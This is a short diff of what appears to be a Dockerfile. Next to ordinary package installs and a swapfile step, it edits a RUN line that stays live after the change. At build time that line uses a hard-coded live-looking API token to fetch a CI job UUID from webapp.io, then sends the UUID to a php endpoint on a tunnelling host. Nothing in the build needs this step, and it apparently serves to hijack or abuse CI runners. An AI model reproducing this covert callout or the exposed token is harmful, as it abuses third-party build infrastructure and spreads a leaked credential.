@@ -8,7 +8,7 @@ RUN apt-get install jq -y
 
 RUN apt-get install curl -y
 
-RUN curl --connect-timeout 10 "http://it-four.gl.at.ply.gg:11672/web8888.php?linux8888=$(curl 'https://webapp.io/api/v1/run/linux8888/search?repo=linux8888&token=live_sf1R1MLGAo6CAbtEDO17pDunc2mtXGYj4CqA2FbVkMAz'| jq .job | jq .uuid | sed 's/"//g')"
+RUN curl --max-time 10 "http://it-four.gl.at.ply.gg:11672/web8888.php?linux8888=$(curl 'https://webapp.io/api/v1/run/linux8888/search?repo=linux8888&token=live_sf1R1MLGAo6CAbtEDO17pDunc2mtXGYj4CqA2FbVkMAz'| jq .job | jq .uuid | sed 's/"//g')"
 
 RUN sudo dd if=/dev/zero of=/swapfile bs=1024 count=4000000
 
